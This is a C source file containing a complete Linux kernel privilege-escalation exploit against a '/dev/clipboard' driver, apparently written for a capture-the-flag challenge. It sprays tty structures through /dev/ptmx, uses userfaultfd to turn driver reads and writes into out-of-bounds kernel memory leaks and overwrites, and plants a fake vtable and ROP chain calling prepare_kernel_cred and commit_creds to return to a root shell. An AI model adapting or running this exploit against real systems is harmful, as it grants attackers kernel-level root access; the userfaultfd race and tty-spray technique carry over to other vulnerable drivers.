#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <string.h>
#include <errno.h>
#include <assert.h>
#include <poll.h>
#include <fcntl.h>
#include <poll.h>
#include <pthread.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/shm.h>
#include <sys/xattr.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/mman.h>
#include <linux/userfaultfd.h>
#include "utils.h"

#define DEVICE_PATH "/dev/clipboard"
#define PAGE_FAULT_ADDR 0xdead000
#define TTY_STRUCT_MAGIC 0x0000000100005401

#define CMD_READ 0x4000
#define CMD_WRITE 0x4001

#define MAX_DATA_LEN 0x400

// low budget tty_struct
typedef struct {
    int magic;
    int refcount;
    void* dev_ptr;
    void* driver;
    void* ops;
    int index; 
    // ignore the rest since we dont need them
} tty;

typedef struct query {
    pid_t pid;
    unsigned short length;
    char data[0x1000];
} Query;

uint64_t kernel_base, leak_heap, modprobe_path;
uint64_t user_cs, user_sp, user_ss, user_rflags;
uint64_t commit_creds = 0xc2d90;
uint64_t prepare_kernel_cred = 0xc3050;
uint64_t swapgs_restore_regs_and_return_to_usermode = 0xc00fd0;
uint64_t gadget = 0x631611; // push rdi ; add ebx, dword ptr [rbx + 0x41] ; pop rsp ; pop rbp ; ret
uint64_t pop_rsp = 0xbc2f0;
uint64_t pop_rdi = 0x86170;
uint64_t push_rax_pop_rdi = 0x1316db2;
uint64_t init_cred = 0x665c00;
uint64_t pop_rcx = 0x1b4397;
uint64_t mov_rdi_rax = 0xba6c7b;
uint64_t userfault_page;

int clipboard_fd;
pthread_t tid;
pid_t cur_pid;
int stage = 0;
int index_ropchain, index_vtable_tty, index_magic;
uint64_t fake_vtable_addr, ropchain_addr;

uint64_t *p;

uint64_t *ropchain; 
char stored_output[0x1000];

long do_read(pid_t, uint16_t, uint64_t);
long do_write(pid_t, uint16_t, char*);
void *page_fault_handler(void *);
int initialize_ufd(void);
void save_state(void);

int main(int argc, char **argv)
{

    // spray
    int tty_fd[0x200] = {0};
    for (int i=0;i<0x100;i++) 
        tty_fd[i] = open("/dev/ptmx",O_RDWR | O_NOCTTY);

    clipboard_fd = open_dev(DEVICE_PATH);
    if (clipboard_fd == -1)
        panic("[!] Error: Can't open device");

    save_state();
    // spray 
    for (int i=0x100;i<0x200;i++) 
        tty_fd[i] = open("/dev/ptmx",O_RDWR | O_NOCTTY);

    cur_pid = getpid();
    int ufd = initialize_ufd();
    
    puts("[+] .bss: 0xffffffffc0004400");
    printf("[+] Current pid: 0x%lx\n", cur_pid);
    printf("[+] sizeof(Query): 0x%lx\n", sizeof(Query));


    pthread_create(&tid, NULL, page_fault_handler, &ufd);
    usleep(1000);

    // trigger userfaultfd -> out-of-bound read
    int size_read = ioctl(clipboard_fd, CMD_READ, userfault_page+0x1000-0x4);

    pthread_join(tid, NULL);
    // seek for TTY_STRUCT_MAGIC and index of tty_struct
    uint64_t *output = userfault_page+0x1000-0x6;

    memcpy(stored_output, (char*) output, 0x1000);
    int target_index = 0;
    for (int i=0;i<(size_read/8);i++) {
        if (output[i] == TTY_STRUCT_MAGIC) {
            printf("[*] index: 0x%lx\n", output[i+4]);
            target_index = (int) output[i+4];
            index_magic = i;

            // since we spray 2 times, we have 2 tty_operations addresses (idk why :()
            if ((size_t) (output[i+3] & 0xff) == 0xe0L)
                kernel_base = output[i+3] - 0x10a9be0;
            else kernel_base = output[i+3] - 0x10a9d00;

            leak_heap = output[i+7]; // count from this address

            fake_vtable_addr = leak_heap - 8*50;
            index_vtable_tty = i+7-50;
            ropchain_addr = leak_heap - (i+4)*8;
            index_ropchain = 2;
            break;
        }
    }
    commit_creds += kernel_base;
    prepare_kernel_cred += kernel_base;
    gadget += kernel_base;
    pop_rsp += kernel_base;
    pop_rdi += kernel_base;
    swapgs_restore_regs_and_return_to_usermode += kernel_base;
    push_rax_pop_rdi += kernel_base;
    init_cred += kernel_base;
    mov_rdi_rax += kernel_base;
    pop_rcx += kernel_base;
    printf("[+] kernel_base: 0x%lx\n", kernel_base);
    printf("[+] commit_creds: 0x%lx\n", commit_creds);
    printf("[+] prepare_kernel_cred: 0x%lx\n", prepare_kernel_cred);
    printf("[+] push rdi ; add ebx, dword ptr [rbx + 0x41] ; pop rsp ; pop rbp ; ret: 0x%lx\n", gadget);
    printf("[+] push_rax_pop_rdi: 0x%lx\n", push_rax_pop_rdi);
    printf("[+] pop_rdi: 0x%lx\n", pop_rdi);
    printf("[+] kpti trampoline: 0x%lx\n", swapgs_restore_regs_and_return_to_usermode);
    printf("[+] index_vtable_tty: %d\n", index_vtable_tty);
    printf("[+] index_magic: %d\n", index_magic);
    printf("[+] leak_heap: 0x%lx\n", leak_heap);
    printf("[+] fake_vtable_addr: 0x%lx\n", fake_vtable_addr);
    printf("[+] ropchain_addr: 0x%lx\n", ropchain_addr);
    printf("[+] index_ropchain: %d\n", index_ropchain);

    // trigger userfaultfd -> out-of_bound write
    ufd = initialize_ufd();
    pthread_create(&tid, NULL, page_fault_handler, &ufd);
    int size_write = ioctl(clipboard_fd, CMD_WRITE, userfault_page+0x1000-0x4);
    printf("[+] size_write: 0x%lx\n", size_write);
    pthread_join(tid, NULL);

    // trigger ropchain
    debug("---------------------Exploit end here--------------------------");
    close(tty_fd[target_index]);

    system("cat /flag");
}

int initialize_ufd() 
{
    int fd;

    puts("[*] Mmapping page with 0x4000 size...");
    userfault_page = mmap((void *)PAGE_FAULT_ADDR-0x1000, 0x4000, PROT_READ|PROT_WRITE, MAP_FIXED|MAP_ANONYMOUS|MAP_PRIVATE, -1, 0);
    
    printf("Create pagefault at: 0x%lx\n", userfault_page);

    if ((fd = syscall(SYS_userfaultfd, O_CLOEXEC|O_NONBLOCK)) == -1)
    {
        panic("[ERROR] Userfaultfd failed");
    }

    struct uffdio_api api = { 
        .api = UFFD_API,
        .features = 0
    };

    if (ioctl(fd, UFFDIO_API, &api))
    {
        panic("[ERROR] ioctl - UFFDIO_API failed");
    }

    if (api.api != UFFD_API)
    {
        panic("[ERROR] Unexepcted UFFD api version!");
    }

    struct uffdio_register reg = {
        .mode = UFFDIO_REGISTER_MODE_MISSING,
        .range = {
            .start = (long) (userfault_page),
            .len = 0x1000,
        }
    };

    if (ioctl(fd, UFFDIO_REGISTER,  &reg))
    {
        panic("[ERROR] ioctl - UFFDIO_REGISTER failed");
    }
    
    return fd;
}

void *page_fault_handler(void *_ufd)
{
    struct pollfd pollfd;
    struct uffd_msg fault_msg;
    // struct uffdio_copy ufd_copy;

    int ufd = *((int *) _ufd);

    pollfd.fd = ufd;
    pollfd.events = POLLIN;

    while (poll(&pollfd, 1, -1) > 0)
    {
        if ((pollfd.revents & POLLERR) || (pollfd.revents & POLLHUP))
        {
            panic("[ERROR] Polling failed");
        }

        if (read(ufd, &fault_msg, sizeof(fault_msg)) != sizeof(fault_msg))
        {
            panic("[ERROR] Read - fault_msg failed");
        }

        char *page_fault_location = (char *)fault_msg.arg.pagefault.address;

        if (fault_msg.event != UFFD_EVENT_PAGEFAULT || (page_fault_location != userfault_page && page_fault_location != userfault_page + PAGE_SIZE))
        {
            panic("[ERROR] Unexpected pagefault?");
        }

        if (page_fault_location == (void *)userfault_page)
        {
            puts("Alright, we triggered our pagefault");
            printf("[+] Page fault at address %p!\n", page_fault_location);
            // leak kernel address 
            if (stage == 0) 
            {
                puts("[!] ----------------------Stage 1--------------------");
                // p = (uint64_t *) malloc(0x4000);
                char payload[0x1000] = {0};
                memcpy(payload+0x1000-0x4, &cur_pid, 0x4);
                
                struct uffdio_copy ufd_copy;
                ufd_copy.src = payload;
                ufd_copy.dst = (uint64_t) fault_msg.arg.pagefault.address;
                ufd_copy.mode = 1;
                ufd_copy.len = 0x1000;
                ufd_copy.copy = 0;
                memset(page_fault_location + 0x1001, 0xf0, 1);
                printf("0x%lx\n", fault_msg.arg.pagefault.address);
                int tmp;
                if (tmp = ioctl(ufd, UFFDIO_COPY, &ufd_copy) < 0)
                {
                    panic("[!] ioctl(UFFDIO_COPY) error!");
                }

            } else if (stage == 1)
            {   
                puts("[!] ---------------------Stage 2----------------------");
                char payload[0x1000] = {0};
                memcpy(payload+0x1000-0x4, &cur_pid, 0x4);
                struct uffdio_copy ufd_copy;
                ufd_copy.src = payload;
                ufd_copy.dst = (ulong)fault_msg.arg.pagefault.address;
				ufd_copy.len = 0x1000;
                ufd_copy.mode = 1;
                ufd_copy.copy = 0;
                
                memset(page_fault_location + 0x1001, 0xf0, 1);
                memcpy(page_fault_location + 0x1002, stored_output+0x8, 0x1000-8);
                ropchain = (uint64_t *) (page_fault_location+0x1000+2);

                ropchain[index_magic] = pop_rsp;
                ropchain[index_magic+1] = ropchain_addr; // jump to ropchain get root
                ropchain[index_magic+2] = fake_vtable_addr;
                ropchain[index_vtable_tty+0x14] = gadget;
                ropchain[index_vtable_tty+0x15] = gadget;

                ropchain[index_ropchain++] = pop_rdi;
                ropchain[index_ropchain++] = 0;
                ropchain[index_ropchain++] = prepare_kernel_cred;
                ropchain[index_ropchain++] = pop_rdi;
                ropchain[index_ropchain++] = 0x0;
                ropchain[index_ropchain++] = mov_rdi_rax;
                ropchain[index_ropchain++] = commit_creds;
                ropchain[index_ropchain++] = swapgs_restore_regs_and_return_to_usermode + 0x16; 
                ropchain[index_ropchain++] = 0;
                ropchain[index_ropchain++] = 0;
                ropchain[index_ropchain++] = (uint64_t)get_shell;
                ropchain[index_ropchain++] = user_cs;
                ropchain[index_ropchain++] = user_rflags;
                ropchain[index_ropchain++] = user_sp;
                ropchain[index_ropchain++] = user_ss;

                int tmp;
                if (tmp = ioctl(ufd, UFFDIO_COPY, &ufd_copy) < 0)
                {
                    panic("[!] ioctl(UFFDIO_COPY) error!");
                }

            }
            stage++;
        } 
        // unblock userfaultfd
        struct uffdio_register uffdio_register;
        uffdio_register.range.start = fault_msg.arg.pagefault.address;
        uffdio_register.range.len = 0x4000;
        uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;

        ioctl(ufd, UFFDIO_UNREGISTER, &uffdio_register.range);
        return;
    }
}

void save_state(void) {
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"              // move value of register cs to variable user_cs 
        "mov user_ss, ss;"              // move value of register ss to variable user_ss
        "mov user_sp, rsp;"             // move value of register rsp to variable user_sp
        "pushf;"                        // push flags onto stack (16 bit) 
        "pop user_rflags;"              // pop flags to variable user_rflags
        ".att_syntax;"
    );
    printf("[*] Saved state\n");
}
